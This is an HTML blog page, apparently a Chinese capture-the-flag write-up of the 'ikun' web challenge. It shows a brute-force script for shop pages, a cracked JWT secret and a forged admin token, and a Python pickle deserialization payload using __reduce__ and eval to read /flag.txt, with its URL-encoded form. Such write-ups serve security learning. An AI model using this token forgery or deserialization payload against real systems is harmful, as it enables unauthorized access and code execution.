@@ -1,0 +1,235 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ikun - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="考点
+Python逻辑漏洞
+JWT伪造
+
+过程第一步，我们爆破找到LV6账号：
+123456789import requestsfor i in range(1,999):    url = &amp;qu,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ikun</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ikun</h1>
+        <div class="stuff">
+            <span>十二月 06, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/BUU/" rel="tag">BUU</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><ol>
+<li>Python逻辑漏洞</li>
+<li>JWT伪造</li>
+</ol>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>第一步，我们爆破找到LV6账号：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    url = <span class="string">&quot;http://25bf3014-fd74-4f4e-882b-5b310346732e.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>购买的时候多点几下触发打折，然后我们手动把折扣改的特别低</p>
+<p><img src="image-20201206194646805.png" alt="image-20201206194646805"></p>
+<p>得到url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1g_m4mber</span><br></pre></td></tr></table></figure>
+
+<p>需要我们用admin登陆，看看自己的情况，大概只能用JWT伪造了，没有密钥丢进去爆破好了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ysllz@kali:~/桌面/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q</span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在这个url下面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;jwt.io&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>编译之后得到：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>
+
+<p>之后去个人中心的邮箱地址下面给了个hint：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">邮箱地址：hint: \u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure>
+
+<p>得到这句话：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把源码dump下来，在Admin.py当中我们可以找到触发点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>找了一篇写pickle的博客：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;article&#x2F;details&#x2F;79027055</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &#123;&#x27;foo&#x27;: [1,2,3],</span></span><br><span class="line"><span class="comment">#                 &#x27;bar&#x27;: (&#x27;Hello&#x27;, &#x27;world!&#x27;),</span></span><br><span class="line"><span class="comment">#                 &#x27;baz&#x27;: True&#125;</span></span><br><span class="line"><span class="comment"># jar = open(&#x27;data.pkl&#x27;, &#x27;wb&#x27;)</span></span><br><span class="line"><span class="comment"># pickle.dump(data, jar) # 将pickle后的数据写入jar文件</span></span><br><span class="line"><span class="comment"># jar.close()</span></span><br><span class="line"></span><br><span class="line">pkl_file = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = pickle.load(pkl_file)</span><br><span class="line">print(data)</span><br><span class="line">pkl_file.close()</span><br></pre></td></tr></table></figure>
+
+<p>大概过程就这样，我们就可以读取文件了，但是很明显这不是我们想要的，因为我们的需要的是一个魔术方法，当我们的文件经过源码中的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br></pre></td></tr></table></figure>
+
+<p>loads过程，或者说是urlib.unquote的时候会自动触发的魔术方法才可以</p>
+<p>在官方文档中可以找到：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__reduce__(self)</span><br><span class="line">当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</span><br><span class="line"></span><br><span class="line">__reduce_ex__(self)</span><br><span class="line">__reduce_ex__ 的存在是为了兼容性。如果它被定义，在pickle时 __reduce_ex__ 会代替 __reduce__ 被调用。 __reduce__ 也可以被定义，用于不支持 __reduce_ex__ 的旧版pickle的API调用。</span><br></pre></td></tr></table></figure>
+
+<p>在这里只能使用reduce这一魔术方法，因为仅仅有该魔术方法会告诉Python你的文件被pickle调用的时候该如何使用它…</p>
+<p>故我们用该魔术方法生成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br><span class="line">c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span><span class="built_in">open</span>%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">过程</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
